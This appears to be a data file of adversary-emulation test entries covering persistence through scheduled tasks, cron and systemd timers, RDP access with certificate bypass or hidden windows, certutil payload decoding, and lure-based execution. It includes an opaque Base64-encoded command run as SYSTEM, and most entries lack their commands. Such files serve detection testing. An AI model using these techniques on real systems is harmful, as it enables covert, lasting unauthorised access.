attacks.command: powershell -Command "try { mkdir '$env:APPDATA\\Microsoft\\Tasks' -ErrorAction SilentlyContinue } catch {}; $action = New-ScheduledTaskAction -Execute 'cmd.exe' -Argument '/c powershell -EncodedCommand JABFAHgAcABvAHIAZQBSAG8AbwB0ACAAPQAgACIASAAwAE0ARQAiADsAIABPAHUAdABwAHUAdA1QAHMAQwBvAG0AbQBhAG4AZAAgACcAVwBhAHMAaABpAG4AZwAgAHMAeQBzAHQAZQBtACAAdABlAG0AcABvAHIAIABkAGkAcgBlAGMAdABvAHIAeQAnACAAPABwAGEAdABoAD4AJABFAHgAcABvAHIAZQBSAG8AbwB0ACQAfAAvAHQAZQBtAHAAIAA8AC8AcABhAHQAaAA+"; $trigger = New-ScheduledTaskTrigger -Daily -At 3:00AM; Register-ScheduledTask -TaskName 'DailyCleanup' -Action $action -Trigger $trigger -User 'SYSTEM' -Force"
attacks.description: Advanced: Uses PowerShell to create a scheduled task that runs daily as SYSTEM, executing a Base64-encoded benign PowerShell command to simulate cleanup.
attacks.expected_behavior: A scheduled task named 'DailyCleanup' is registered to run daily at 3:00 AM as SYSTEM. It executes a decoded PowerShell command that outputs a benign message. Task creation requires admin rights.

attacks.description: Installs a user-level cron job that runs on reboot to write a test message to a log file.
attacks.expected_behavior: The command sets a user-specific cron job that executes at reboot. A file /tmp/scheduled_test.log will be created on next boot with the content 'test'. No privilege escalation is needed.

attacks.description: Creates a periodic cron job via /etc/cron.d to execute a script hourly as root.
attacks.expected_behavior: The command creates a script in /tmp and installs a system-wide cron job that runs it hourly as root. The script writes 'test' to /var/log/scheduled_job.log. Requires root privileges to write to /etc/cron.d.

attacks.command:
echo '[Unit]
Description=Persistent Timer

[Service]
Type=oneshot
ExecStart=/bin/sh -c "echo \"test\" > /tmp/systemd_scheduled.log"

[Timer]
OnBootSec=60
OnUnitActiveSec=300
Unit=PersistentJob.service

[Install]
WantedBy=timers.target' > /etc/systemd/system/PersistentJob.timer && systemctl daemon-reload && systemctl enable --now PersistentJob.timer
attacks.description: Creates a systemd timer unit that runs a job 60 seconds after boot and every 5 minutes thereafter.
attacks.expected_behavior: A systemd timer is created and activated. It runs a service 60 seconds after boot and every 5 minutes. The service writes 'test' to /tmp/systemd_scheduled.log. Requires root to write to /etc/systemd/system and enable the service.

attacks.description: Initiate a basic Remote Desktop connection to a target IP address.
attacks.expected_behavior: Opens the Remote Desktop Connection client and attempts to connect to 192.168.1.100. User will see a login prompt. No credentials are saved.

attacks.description: Initiate an RDP connection to the target using the admin flag to connect to the console session, simulating privileged access.
attacks.expected_behavior: Attempts to connect to 192.168.1.100 using administrative privileges (console session). The 'echo yes' simulates user confirmation if prompted by the system.

attacks.description: Launch an RDP session using PowerShell with hidden window style, simulating stealthier execution.
attacks.expected_behavior: Starts mstsc.exe with the specified target IP in a hidden window. This may evade casual user detection but still generates RDP-related artifacts and network traffic.

attacks.description: Basic RDP connection using rdesktop with username and password
attacks.expected_behavior: Attempts to establish an RDP session to 192.168.1.100 using specified credentials and screen resolution

attacks.description: Intermediate RDP connection using FreeRDP with certificate bypass
attacks.expected_behavior: Establishes an RDP session to 10.0.0.5 using FreeRDP, ignoring certificate errors and specifying screen size

attacks.description: Advanced RDP connection with dynamic resolution and specific security protocol
attacks.expected_behavior: Connects to 172.16.0.20 using RDP security, enabling dynamic resolution resizing during session

attacks.description: Decodes a base64-encoded executable from a text file and executes it using certutil and direct invocation.
attacks.expected_behavior: certutil decodes a file from %TEMP%\payload.txt into %TEMP%\malware.exe and then executes it. Simulates execution of a decoded malicious payload. Uses only built-in Windows tools.

attacks.description: Creates a directory, archives calc.exe, extracts it, and executes it to simulate user launching a seemingly legitimate file from a downloaded archive.
attacks.expected_behavior: Simulates user extracting and running a file from a ZIP archive. Uses PowerShell for archiving and extraction, but executes a harmless calc.exe. Directory creation uses error suppression for robustness.

attacks.command: powershell -Command "Write-Host 'Document requires macro enablement to load properly.'; Start-Sleep -s 2; $cmd = 'cmd /c calc.exe'; Invoke-Expression $cmd"
attacks.description: Simulates user interaction with a deceptive message followed by execution of a command, mimicking social engineering leading to malicious file execution.
attacks.expected_behavior: Displays a fake message to simulate user interaction, waits 2 seconds, then executes calc.exe via cmd. Uses only standard PowerShell cmdlets, no .NET reflection. Escaping is correct with double quotes around the command string.

attacks.description: Basic simulation: Create and execute a benign script in user cache directory.
attacks.expected_behavior: A script is written to the user's cache directory, made executable, and run. Outputs a test message to stdout.

attacks.description: Intermediate simulation: Create a multi-line script with common obfuscation-like formatting and execute via sh.
attacks.expected_behavior: A script is created in the temp directory with escaped newlines, made executable, and executed using sh. Simulates execution of a downloaded malicious updater.

attacks.description: Advanced simulation: Place a benign executable in a user-writable binary-like directory and run it, mimicking persistence via user PATH.
attacks.expected_behavior: Creates a local 'bin' directory, adds a fake update script, makes it executable, and runs it. Simulates placement of malicious file in user path for execution.
